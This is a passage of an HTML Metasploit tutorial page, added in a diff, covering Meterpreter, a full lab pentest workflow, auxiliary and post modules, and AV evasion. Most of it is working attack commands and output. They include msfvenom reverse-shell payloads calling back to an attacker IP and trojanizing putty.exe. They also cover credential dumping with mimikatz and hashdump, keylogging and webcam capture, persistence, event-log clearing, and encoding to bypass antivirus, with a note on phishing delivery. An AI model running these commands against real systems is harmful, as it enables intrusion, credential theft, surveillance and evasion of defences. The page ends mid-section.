+<span class="o3">msf6 handler &gt; </span><span class="c">set LHOST 10.10.14.5</span>
+<span class="o3">msf6 handler &gt; </span><span class="c">set LPORT 4444</span>
+<span class="hl2"><span class="o3">msf6 handler &gt; </span><span class="c">run -j</span>    <span class="cm2"># -j = run as background job, wait for connections</span></span>
+<span class="o">[*] Exploit running as background job 0.</span>
+<span class="o">[*] Started reverse TCP handler on 10.10.14.5:4444</span></pre>
+    </div></div>
+  </div>
+
+  <div class="box">
+    <div class="box-title"><div class="pip"></div>PAYLOAD TYPE REFERENCE TABLE</div>
+    <table class="pay-table">
+      <tr><th>PAYLOAD</th><th>PLATFORM</th><th>CONNECTION</th><th>TYPE</th><th>USE CASE</th></tr>
+      <tr><td class="pname">windows/x64/meterpreter/reverse_tcp</td><td>Windows x64</td><td class="pgood">Reverse TCP</td><td>Staged</td><td>Standard pentest against Windows</td></tr>
+      <tr><td class="pname">windows/x64/meterpreter/reverse_https</td><td>Windows x64</td><td class="pgood">Reverse HTTPS 443</td><td>Staged</td><td>Bypasses firewalls (looks like HTTPS)</td></tr>
+      <tr><td class="pname">linux/x64/meterpreter/reverse_tcp</td><td>Linux x64</td><td class="pgood">Reverse TCP</td><td>Staged</td><td>Standard against Linux servers</td></tr>
+      <tr><td class="pname">windows/x64/shell/reverse_tcp</td><td>Windows x64</td><td class="pgood">Reverse TCP</td><td>Staged</td><td>Basic cmd.exe shell</td></tr>
+      <tr><td class="pname">cmd/windows/powershell_reverse_tcp</td><td>Windows</td><td class="pgood">Reverse TCP</td><td>Single</td><td>Fileless PowerShell shell</td></tr>
+      <tr><td class="pname">php/meterpreter_reverse_tcp</td><td>PHP</td><td class="pgood">Reverse TCP</td><td>Single</td><td>Web server PHP shells</td></tr>
+      <tr><td class="pname">java/meterpreter/reverse_tcp</td><td>Java/JSP</td><td class="pgood">Reverse TCP</td><td>Staged</td><td>Java application servers</td></tr>
+      <tr><td class="pname">python/meterpreter/reverse_tcp</td><td>Python</td><td class="pgood">Reverse TCP</td><td>Staged</td><td>Python-enabled targets</td></tr>
+      <tr><td class="pname">android/meterpreter/reverse_tcp</td><td>Android</td><td class="pgood">Reverse TCP</td><td>Staged</td><td>Android device testing</td></tr>
+      <tr><td class="pname">apple_ios/aarch64/meterpreter_reverse_tcp</td><td>iOS</td><td class="pgood">Reverse TCP</td><td>Single</td><td>Jailbroken iOS research</td></tr>
+    </table>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════
+  6 — METERPRETER
+═══════════════════════════ -->
+<div id="p-meterpreter" class="panel">
+<div class="wrap">
+  <div class="sec">
+    <div class="tag">Chapter 6 — Advanced Shell</div>
+    <h2>Meterpreter — The Advanced Post-Exploitation Shell</h2>
+    <p>Meterpreter (Meta-Interpreter) is Metasploit's advanced payload that provides an interactive shell with powerful post-exploitation capabilities. It runs <strong style="color:var(--red)">entirely in memory</strong>, leaves minimal disk traces, communicates over encrypted channels, and can be extended with scripts.</p>
+  </div>
+
+  <div class="mtr-grid">
+    <div class="mtr-section">
+      <h5>🔍 System Information</h5>
+      <div class="mtr-cmd"><span class="cmd">sysinfo</span><span class="desc">OS, hostname, arch, domain</span></div>
+      <div class="mtr-cmd"><span class="cmd">getuid</span><span class="desc">Current user identity</span></div>
+      <div class="mtr-cmd"><span class="cmd">getpid</span><span class="desc">Meterpreter process ID</span></div>
+      <div class="mtr-cmd"><span class="cmd">ps</span><span class="desc">List all running processes</span></div>
+      <div class="mtr-cmd"><span class="cmd">pgrep lsass</span><span class="desc">Find process by name</span></div>
+      <div class="mtr-cmd"><span class="cmd">idletime</span><span class="desc">Target idle time (AFK?)</span></div>
+      <div class="mtr-cmd"><span class="cmd">route</span><span class="desc">Network routing table</span></div>
+      <div class="mtr-cmd"><span class="cmd">ipconfig</span><span class="desc">Network interfaces</span></div>
+      <div class="mtr-cmd"><span class="cmd">arp</span><span class="desc">ARP cache (find other hosts)</span></div>
+    </div>
+    <div class="mtr-section">
+      <h5>🗂️ File System</h5>
+      <div class="mtr-cmd"><span class="cmd">pwd</span><span class="desc">Current directory</span></div>
+      <div class="mtr-cmd"><span class="cmd">ls</span><span class="desc">List directory contents</span></div>
+      <div class="mtr-cmd"><span class="cmd">cd C:\\Users</span><span class="desc">Change directory</span></div>
+      <div class="mtr-cmd"><span class="cmd">cat file.txt</span><span class="desc">Read file contents</span></div>
+      <div class="mtr-cmd"><span class="cmd">upload file.exe</span><span class="desc">Upload file to target</span></div>
+      <div class="mtr-cmd"><span class="cmd">download creds.txt</span><span class="desc">Download file from target</span></div>
+      <div class="mtr-cmd"><span class="cmd">search -f *.config</span><span class="desc">Search files by pattern</span></div>
+      <div class="mtr-cmd"><span class="cmd">edit file.txt</span><span class="desc">Edit file (vi editor)</span></div>
+      <div class="mtr-cmd"><span class="cmd">rm file.txt</span><span class="desc">Delete file</span></div>
+    </div>
+    <div class="mtr-section">
+      <h5>⚡ Privilege Escalation</h5>
+      <div class="mtr-cmd"><span class="cmd">getsystem</span><span class="desc">Attempt auto privilege escalation</span></div>
+      <div class="mtr-cmd"><span class="cmd">getprivs</span><span class="desc">List current privileges</span></div>
+      <div class="mtr-cmd"><span class="cmd">migrate 1234</span><span class="desc">Migrate to more stable process</span></div>
+      <div class="mtr-cmd"><span class="cmd">steal_token 1234</span><span class="desc">Steal process token</span></div>
+      <div class="mtr-cmd"><span class="cmd">use priv</span><span class="desc">Load priv extension</span></div>
+      <div class="mtr-cmd"><span class="cmd">run post/multi/recon/</span><span class="desc">Run recon post module</span></div>
+      <div class="mtr-cmd"><span class="cmd">run post/windows/escalate/</span><span class="desc">Run escalation module</span></div>
+      <div class="mtr-cmd"><span class="cmd">shell</span><span class="desc">Drop to cmd.exe shell</span></div>
+    </div>
+    <div class="mtr-section">
+      <h5>🔑 Credential Dumping</h5>
+      <div class="mtr-cmd"><span class="cmd">hashdump</span><span class="desc">Dump SAM database (NTLM hashes)</span></div>
+      <div class="mtr-cmd"><span class="cmd">run post/windows/gather/</span><span class="desc">Run gather modules</span></div>
+      <div class="mtr-cmd"><span class="cmd">load kiwi</span><span class="desc">Load Mimikatz extension</span></div>
+      <div class="mtr-cmd"><span class="cmd">creds_all</span><span class="desc">Dump all creds (kiwi)</span></div>
+      <div class="mtr-cmd"><span class="cmd">lsa_dump_sam</span><span class="desc">Dump SAM hashes (kiwi)</span></div>
+      <div class="mtr-cmd"><span class="cmd">lsa_dump_secrets</span><span class="desc">Dump LSA secrets (kiwi)</span></div>
+      <div class="mtr-cmd"><span class="cmd">wifi_list</span><span class="desc">List saved WiFi passwords</span></div>
+    </div>
+    <div class="mtr-section">
+      <h5>📹 Surveillance</h5>
+      <div class="mtr-cmd"><span class="cmd">screenshot</span><span class="desc">Take desktop screenshot</span></div>
+      <div class="mtr-cmd"><span class="cmd">screenshare</span><span class="desc">Live desktop streaming</span></div>
+      <div class="mtr-cmd"><span class="cmd">webcam_list</span><span class="desc">List webcam devices</span></div>
+      <div class="mtr-cmd"><span class="cmd">webcam_snap</span><span class="desc">Capture webcam photo</span></div>
+      <div class="mtr-cmd"><span class="cmd">webcam_stream</span><span class="desc">Live webcam stream</span></div>
+      <div class="mtr-cmd"><span class="cmd">record_mic</span><span class="desc">Record microphone</span></div>
+      <div class="mtr-cmd"><span class="cmd">keyscan_start</span><span class="desc">Start keylogger</span></div>
+      <div class="mtr-cmd"><span class="cmd">keyscan_dump</span><span class="desc">Dump captured keystrokes</span></div>
+      <div class="mtr-cmd"><span class="cmd">keyscan_stop</span><span class="desc">Stop keylogger</span></div>
+    </div>
+    <div class="mtr-section">
+      <h5>🌐 Pivoting & Networking</h5>
+      <div class="mtr-cmd"><span class="cmd">portfwd add -l 8080 -p 80 -r target</span><span class="desc">Port forward</span></div>
+      <div class="mtr-cmd"><span class="cmd">run autoroute -s 10.10.10.0/24</span><span class="desc">Add route to subnet</span></div>
+      <div class="mtr-cmd"><span class="cmd">background</span><span class="desc">Background this session</span></div>
+      <div class="mtr-cmd"><span class="cmd">sessions -u 1</span><span class="desc">Upgrade shell to Meterpreter</span></div>
+      <div class="mtr-cmd"><span class="cmd">pivot</span><span class="desc">Set up pivot listener</span></div>
+      <div class="mtr-cmd"><span class="cmd">load incognito</span><span class="desc">Load token impersonation</span></div>
+      <div class="mtr-cmd"><span class="cmd">list_tokens -u</span><span class="desc">List available tokens</span></div>
+      <div class="mtr-cmd"><span class="cmd">impersonate_token "DOMAIN\\Admin"</span><span class="desc">Impersonate token</span></div>
+    </div>
+    <div class="mtr-section">
+      <h5>🛡️ Persistence & Cleanup</h5>
+      <div class="mtr-cmd"><span class="cmd">run post/windows/manage/persistence</span><span class="desc">Persist via registry</span></div>
+      <div class="mtr-cmd"><span class="cmd">run post/linux/manage/sshkey_persistence</span><span class="desc">Add SSH key</span></div>
+      <div class="mtr-cmd"><span class="cmd">clearev</span><span class="desc">Clear Windows event logs</span></div>
+      <div class="mtr-cmd"><span class="cmd">timestomp file.exe</span><span class="desc">Modify file timestamps</span></div>
+      <div class="mtr-cmd"><span class="cmd">rm payload.exe</span><span class="desc">Delete dropped files</span></div>
+      <div class="mtr-cmd"><span class="cmd">shell cmd /c "sc delete svc"</span><span class="desc">Remove services</span></div>
+    </div>
+    <div class="mtr-section">
+      <h5>🔧 Session Management</h5>
+      <div class="mtr-cmd"><span class="cmd">help</span><span class="desc">All Meterpreter commands</span></div>
+      <div class="mtr-cmd"><span class="cmd">background / bg</span><span class="desc">Background this session</span></div>
+      <div class="mtr-cmd"><span class="cmd">sessions -l</span><span class="desc">List all sessions</span></div>
+      <div class="mtr-cmd"><span class="cmd">sessions -i 1</span><span class="desc">Interact with session 1</span></div>
+      <div class="mtr-cmd"><span class="cmd">sessions -k 1</span><span class="desc">Kill session 1</span></div>
+      <div class="mtr-cmd"><span class="cmd">run script.rb</span><span class="desc">Run Meterpreter Ruby script</span></div>
+      <div class="mtr-cmd"><span class="cmd">resource /path/cmds.rc</span><span class="desc">Run command script file</span></div>
+      <div class="mtr-cmd"><span class="cmd">exit</span><span class="desc">Close Meterpreter session</span></div>
+    </div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar"><div class="term-dot" style="background:#ff5f57"></div><div class="term-dot" style="background:#ffbd2e"></div><div class="term-dot" style="background:#28ca41"></div><span class="term-title">METERPRETER SESSION — CREDENTIAL DUMPING EXAMPLE</span></div>
+    <div class="term-body"><pre>
+<span class="o6">meterpreter &gt; </span><span class="c">sysinfo</span>
+<span class="o">Computer        : WIN10-VICTIM
+OS              : Windows 10 (10.0 Build 19044).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows</span>
+
+<span class="o6">meterpreter &gt; </span><span class="c">getuid</span>
+<span class="o">Server username: WIN10-VICTIM\john</span>
+
+<span class="cm2"># Try to escalate to SYSTEM</span>
+<span class="o6">meterpreter &gt; </span><span class="c">getsystem</span>
+<span class="o4">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span>
+<span class="o6">meterpreter &gt; </span><span class="c">getuid</span>
+<span class="o4">Server username: NT AUTHORITY\SYSTEM</span>
+
+<span class="cm2"># Migrate to a stable SYSTEM process</span>
+<span class="o6">meterpreter &gt; </span><span class="c">ps | grep lsass</span>
+<span class="o">  640   winlogon.exe   x64   0   NT AUTHORITY\SYSTEM
+  780   services.exe   x64   0   NT AUTHORITY\SYSTEM
+  788   lsass.exe      x64   0   NT AUTHORITY\SYSTEM</span>
+<span class="hl2"><span class="o6">meterpreter &gt; </span><span class="c">migrate 788</span>
+<span class="o">[*] Migrating from 4576 to 788...</span>
+<span class="o4">[+] Migration completed successfully.</span></span>
+
+<span class="cm2"># Load Mimikatz (kiwi extension)</span>
+<span class="hl2"><span class="o6">meterpreter &gt; </span><span class="c">load kiwi</span>
+<span class="o2">Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi`
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX              (vincent.letoux@gmail.com)
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com ***/
+Success.</span></span>
+
+<span class="o6">meterpreter &gt; </span><span class="c">creds_all</span>
+<span class="o4">[+] Running as SYSTEM
+[*] Retrieving all credentials</span>
+<span class="o">msv credentials
+===============
+Username  Domain      NTLM Hash                         SHA1 Hash
+--------  ------      ---------                         ---------
+john      WIN10-VICTIM  8846f7eaee8fb117ad06bdd830b7586c  ...
+
+wdigest credentials
+===================
+Username    Domain          Password
+--------    ------          --------
+john        WIN10-VICTIM  <span style="color:var(--red)">Password123!</span>
+</span>
+<span class="o6">meterpreter &gt; </span><span class="c">hashdump</span>
+<span class="o4">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+john:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></pre>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════
+  7 — PENTEST WORKFLOW
+═══════════════════════════ -->
+<div id="p-workflow" class="panel">
+<div class="wrap">
+  <div class="sec">
+    <div class="tag">Chapter 7 — Full Workflow</div>
+    <h2>Complete Penetration Test Workflow with Metasploit</h2>
+    <p>A real penetration test follows a structured methodology. Here is a complete end-to-end workflow from initial reconnaissance through to reporting, using Metasploit at each phase against a test environment.</p>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar"><div class="term-dot" style="background:#ff5f57"></div><div class="term-dot" style="background:#ffbd2e"></div><div class="term-dot" style="background:#28ca41"></div><span class="term-title">PHASE 1 — RECONNAISSANCE & SCANNING (db_nmap + auxiliary)</span></div>
+    <div class="term-body"><pre>
+<span class="cm2"># ─── SET UP WORKSPACE ────────────────────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">workspace -a engagement_01</span>
+<span class="o">[*] Added workspace: engagement_01</span>
+<span class="o3">msf6 &gt; </span><span class="c">workspace engagement_01</span>
+
+<span class="cm2"># ─── NMAP SCAN — RESULTS STORED IN DATABASE ──────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">db_nmap -sV -sC -O -p- --min-rate 5000 192.168.1.0/24</span>
+<span class="o">[*] Nmap: Nmap scan report for 192.168.1.100
+[*] Nmap: Host is up (0.001s latency).
+[*] Nmap: PORT     STATE  SERVICE       VERSION
+[*] Nmap:  21/tcp  open   ftp           vsftpd 2.3.4
+[*] Nmap:  22/tcp  open   ssh           OpenSSH 4.7p1
+[*] Nmap:  80/tcp  open   http          Apache httpd 2.2.8
+[*] Nmap: 139/tcp  open   netbios-ssn   Samba smbd 3.X
+[*] Nmap: 445/tcp  open   microsoft-ds  Samba smbd 3.0.20</span>
+
+<span class="cm2"># Review discovered hosts and services:</span>
+<span class="o3">msf6 &gt; </span><span class="c">hosts</span>
+<span class="o">Hosts
+=====
+address        mac  name     os_name  os_flavor  os_sp  arch
+-------        ---  ----     -------  ---------  -----  ----
+192.168.1.100       victim   Linux    Debian      2.6    x86</span>
+<span class="o3">msf6 &gt; </span><span class="c">services</span>
+<span class="o">Services
+========
+host           port  proto  name  state  info
+----           ----  -----  ----  -----  ----
+192.168.1.100  21    tcp    ftp   open   vsftpd 2.3.4
+192.168.1.100  445   tcp    smb   open   Samba 3.0.20</span>
+
+<span class="cm2"># ─── VULNERABILITY SCAN WITH AUXILIARY ────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/smb/smb_ms17_010</span>
+<span class="o3">msf6 auxiliary(smb_ms17_010) &gt; </span><span class="c">set RHOSTS 192.168.1.0/24</span>
+<span class="o3">msf6 auxiliary(smb_ms17_010) &gt; </span><span class="c">run</span>
+<span class="o4">[+] 192.168.1.100:445 - Host is likely VULNERABLE to MS17-010!</span></pre>
+    </div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar"><div class="term-dot" style="background:#ff5f57"></div><div class="term-dot" style="background:#ffbd2e"></div><div class="term-dot" style="background:#28ca41"></div><span class="term-title">PHASE 2 — EXPLOITATION → POST-EXPLOITATION → PIVOTING</span></div>
+    <div class="term-body"><pre>
+<span class="cm2"># ─── EXPLOIT vsftpd 2.3.4 BACKDOOR ────────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">search vsftpd 2.3.4</span>
+<span class="o3">msf6 &gt; </span><span class="c">use exploit/unix/ftp/vsftpd_234_backdoor</span>
+<span class="o3">msf6 exploit(vsftpd_234_backdoor) &gt; </span><span class="c">set RHOSTS 192.168.1.100</span>
+<span class="o3">msf6 exploit(vsftpd_234_backdoor) &gt; </span><span class="c">run</span>
+<span class="o4">[+] 192.168.1.100:21 - Backdoor service has been spawned, handling...</span>
+<span class="o4">[+] 192.168.1.100:21 - UID: uid=0(root) gid=0(root)</span>
+<span class="o6">[*] Command shell session 1 opened</span>
+<span class="o6">
+Command Shell Session 1
+=======================
+id
+uid=0(root) gid=0(root)
+hostname
+metasploitable</span>
+
+<span class="cm2"># Upgrade plain shell to Meterpreter:</span>
+<span class="hl2"><span class="o3">msf6 exploit(...) &gt; </span><span class="c">sessions -u 1</span>
+<span class="o">[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]</span>
+<span class="o4">[+] New session created: 2 (Meterpreter)</span></span>
+<span class="o3">msf6 &gt; </span><span class="c">sessions -i 2</span>
+<span class="o6">meterpreter &gt; </span>
+
+<span class="cm2"># ─── POST-EXPLOITATION: GATHER INTEL ──────────────────────────────────────────</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/linux/gather/enum_system</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/linux/gather/hashdump</span>
+<span class="o4">[+] /etc/shadow contents retrieved:
+root:$6$abc123...:18000:0:99999:7:::
+www-data:x:33:33:</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/multi/gather/env</span>
+
+<span class="cm2"># ─── PIVOTING TO INTERNAL NETWORK ─────────────────────────────────────────────</span>
+<span class="o6">meterpreter &gt; </span><span class="c">ipconfig</span>
+<span class="o">Interface  2
+-----------
+Name       : eth0
+Hardware   : 00:0c:29:xx:xx:xx
+<span style="color:var(--red)">Address    : 192.168.1.100/24   ← DMZ network</span>
+Interface  3
+-----------
+Name       : eth1
+<span style="color:var(--orange)">Address    : 10.10.10.5/24      ← INTERNAL network! (pivot target)</span></span>
+
+<span class="cm2"># Add route to internal network through this session:</span>
+<span class="hl2"><span class="o6">meterpreter &gt; </span><span class="c">run autoroute -s 10.10.10.0/24</span>
+<span class="o4">[+] Route added to subnet 10.10.10.0/255.255.255.0.</span></span>
+<span class="o6">meterpreter &gt; </span><span class="c">background</span>
+
+<span class="cm2"># Now scan internal network THROUGH the pivot:</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/portscan/tcp</span>
+<span class="o3">msf6 &gt; </span><span class="c">set RHOSTS 10.10.10.0/24</span>
+<span class="o3">msf6 &gt; </span><span class="c">run</span>
+<span class="o4">[+] 10.10.10.20:80    - TCP OPEN (web server on internal network!)</span>
+<span class="o4">[+] 10.10.10.30:3389  - TCP OPEN (RDP - internal Windows machine!)</span></pre>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════
+  8 — AUXILIARY & POST
+═══════════════════════════ -->
+<div id="p-auxpost" class="panel">
+<div class="wrap">
+  <div class="sec">
+    <div class="tag">Chapter 8 — Supporting Modules</div>
+    <h2>Auxiliary Modules &amp; Post-Exploitation</h2>
+    <p>Auxiliary modules perform tasks without needing an exploit — scanning, brute-forcing, sniffing, and fuzzing. Post modules run after a successful exploit to gather information, escalate privileges, and establish persistence.</p>
+  </div>
+
+  <div class="two-even">
+  <div>
+  <div class="box">
+    <div class="box-title"><div class="pip"></div>KEY AUXILIARY MODULES</div>
+    <div class="terminal" style="margin:0;border:none;border-radius:0;"><div class="term-body"><pre>
+<span class="cm2"># ── PORT SCANNING ──────────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/portscan/tcp</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/portscan/syn</span>
+<span class="o3">msf6 &gt; </span><span class="c">set RHOSTS 10.10.10.0/24</span>
+<span class="o3">msf6 &gt; </span><span class="c">set PORTS 22,80,443,445,3389</span>
+
+<span class="cm2"># ── SERVICE ENUMERATION ────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/smb/smb_enumshares</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/ssh/ssh_version</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/http/dir_scanner</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/ftp/anonymous</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/vnc/vnc_none_auth</span>
+
+<span class="cm2"># ── BRUTE-FORCE LOGIN ─────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/ssh/ssh_login</span>
+<span class="o3">msf6 &gt; </span><span class="c">set USERNAME admin</span>
+<span class="o3">msf6 &gt; </span><span class="c">set PASS_FILE /usr/share/wordlists/rockyou.txt</span>
+<span class="o3">msf6 &gt; </span><span class="c">set RHOSTS 10.10.10.1</span>
+<span class="o3">msf6 &gt; </span><span class="c">run</span>
+<span class="o4">[+] SSH - Success: admin:password123 (uid=0(root))</span>
+
+<span class="cm2"># ── SQL SERVER ────────────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/mssql/mssql_login</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/admin/mssql/mssql_exec</span>
+<span class="o3">msf6 &gt; </span><span class="c">set CMD "whoami"</span>
+
+<span class="cm2"># ── SNIFFING ──────────────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/sniffer/psnuffle</span>  <span class="cm2"># capture creds</span>
+
+<span class="cm2"># ── VULNERABILITY CHECK ──────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/smb/smb_ms17_010</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/http/shellshock</span>
+<span class="o3">msf6 &gt; </span><span class="c">use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span></pre>
+    </div></div>
+  </div>
+  </div>
+
+  <div>
+  <div class="box">
+    <div class="box-title"><div class="pip"></div>ESSENTIAL POST MODULES</div>
+    <div class="terminal" style="margin:0;border:none;border-radius:0;"><div class="term-body"><pre>
+<span class="cm2"># ── SYSTEM INFORMATION ────────────────────────────────────────</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/multi/recon/local_exploit_suggester</span>
+<span class="o4">[+] Possible exploits for Windows 10 Build 19044:</span>
+<span class="o4">    exploit/windows/local/cve_2021_34527_printspooler</span>
+<span class="o4">    exploit/windows/local/bypassuac_eventvwr</span>
+
+<span class="o6">meterpreter &gt; </span><span class="c">run post/windows/gather/checkvm</span>
+<span class="o">[*] This is a VMware Virtual Machine</span>
+
+<span class="cm2"># ── CREDENTIAL GATHERING ─────────────────────────────────────</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/windows/gather/credentials/credential_collector</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/windows/gather/credentials/vnc</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/windows/gather/credentials/winscp</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/multi/gather/ssh_creds</span>
+
+<span class="cm2"># ── FILE DISCOVERY ────────────────────────────────────────────</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/multi/gather/find_files FILES="*.kdbx,*.key,id_rsa"</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/windows/gather/enum_shares</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/windows/gather/enum_applications</span>
+
+<span class="cm2"># ── PRIVILEGE ESCALATION ──────────────────────────────────────</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/windows/escalate/getsystem</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/windows/escalate/bypassuac</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/linux/escalate/sudo_nmap</span>
+
+<span class="cm2"># ── PERSISTENCE ──────────────────────────────────────────────</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/windows/manage/persistence_exe STARTUP=SCHEDULER</span>
+<span class="o6">meterpreter &gt; </span><span class="c">run post/linux/manage/sshkey_persistence</span></pre>
+    </div></div>
+  </div>
+  </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════
+  9 — EVASION & ENCODING
+═══════════════════════════ -->
+<div id="p-evasion" class="panel">
+<div class="wrap">
+  <div class="sec">
+    <div class="tag">Chapter 9 — Evasion</div>
+    <h2>Evasion, Encoding &amp; AV Bypass</h2>
+    <p>Modern defences — antivirus (AV), endpoint detection &amp; response (EDR), and intrusion detection systems (IDS) — detect known payloads by signature, behaviour, or heuristics. Evasion techniques are essential for realistic red team assessments against hardened environments.</p>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar"><div class="term-dot" style="background:#ff5f57"></div><div class="term-dot" style="background:#ffbd2e"></div><div class="term-dot" style="background:#28ca41"></div><span class="term-title">ENCODING, OBFUSCATION & EVASION TECHNIQUES</span></div>
+    <div class="term-body"><pre>
+<span class="cm2"># ─── LIST ALL AVAILABLE ENCODERS ─────────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">show encoders</span>
+<span class="o">Encoders
+========
+Name                          Rank    Description
+----                          ----    -----------
+x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback
+x86/countdown                 normal     Single-byte XOR Countdown Encoder
+x64/xor_dynamic               normal     Dynamic key XOR Encoder
+x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
+cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</span>
+
+<span class="cm2"># ─── SHIKATA GA NI (MOST POWERFUL POLYMORPHIC ENCODER) ───────────────────────</span>
+<span class="hl2"><span class="p">$ </span><span class="c">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
+        -e x86/shikata_ga_nai -i 15 -b "\x00\x0a\x0d" \
+        -f exe -o shikata_15iter.exe</span></span>
+<span class="cm2"># -i 15 = 15 encoding iterations (more = harder to detect, but also bigger)</span>
+<span class="cm2"># -b "\x00\x0a\x0d" = bad chars to avoid (null byte, newline, CR)</span>
+
+<span class="cm2"># ─── CUSTOM TEMPLATE (hide payload in legitimate executable) ─────────────────</span>
+<span class="p">$ </span><span class="c">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
+        -x /path/to/putty.exe -k -f exe -o infected_putty.exe</span>
+<span class="cm2"># -x = use template exe  -k = keep template functionality (spawns payload)</span>
+
+<span class="cm2"># ─── EVASION MODULES (purpose-built AV bypass) ───────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">use evasion/windows/windows_defender_exe</span>
+<span class="o3">msf6 evasion(windows_defender_exe) &gt; </span><span class="c">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span>
+<span class="o3">msf6 evasion(windows_defender_exe) &gt; </span><span class="c">set LHOST 10.10.14.5</span>
+<span class="o3">msf6 evasion(windows_defender_exe) &gt; </span><span class="c">run</span>
+<span class="o4">[+] evasion.exe stored at /tmp/evasion.exe</span>
+
+<span class="cm2"># ─── POWERSHELL (IN-MEMORY, FILELESS) ────────────────────────────────────────</span>
+<span class="hl2"><span class="p">$ </span><span class="c">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
+        -f psh-reflection > payload.ps1</span></span>
+<span class="cm2"># Reflection = loads DLL directly into memory. No exe touches disk.</span>
+<span class="cm2"># Deliver via email/phish: powershell.exe -ExecutionPolicy Bypass -File payload.ps1</span>
+
+<span class="cm2"># ─── HTTPS PAYLOAD (encrypted C2 traffic) ────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">use exploit/multi/handler</span>
+<span class="o3">msf6 handler &gt; </span><span class="c">set PAYLOAD windows/x64/meterpreter/reverse_https</span>
+<span class="o3">msf6 handler &gt; </span><span class="c">set LHOST 0.0.0.0</span>
+<span class="o3">msf6 handler &gt; </span><span class="c">set LPORT 443</span>
+<span class="hl2"><span class="o3">msf6 handler &gt; </span><span class="c">set EnableStageEncoding true</span>    <span class="cm2"># encrypt the Meterpreter stage</span></span>
+<span class="o3">msf6 handler &gt; </span><span class="c">set StageEncoder x86/shikata_ga_nai</span>
+<span class="o3">msf6 handler &gt; </span><span class="c">run -j</span>
+
+<span class="cm2"># ─── CHECK AV DETECTION (upload to VirusTotal via msfvenom --save) ───────────</span>
+<span class="p">$ </span><span class="c">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
+        -f exe | sha256sum</span>
+<span class="cm2"># Then check hash on virustotal.com BEFORE delivery</span></pre>
+    </div>
+  </div>
+
+  <div class="three-col">
+    <div class="card" style="--cl:var(--red)"><h4>Why Signatures Fail</h4><p>AV products maintain signature databases of known malicious byte patterns. When Metasploit payloads are encoded with <code>shikata_ga_nai</code>, each iteration produces a different byte sequence — defeating static signature matching. The polymorphic nature means each generation looks different.</p></div>
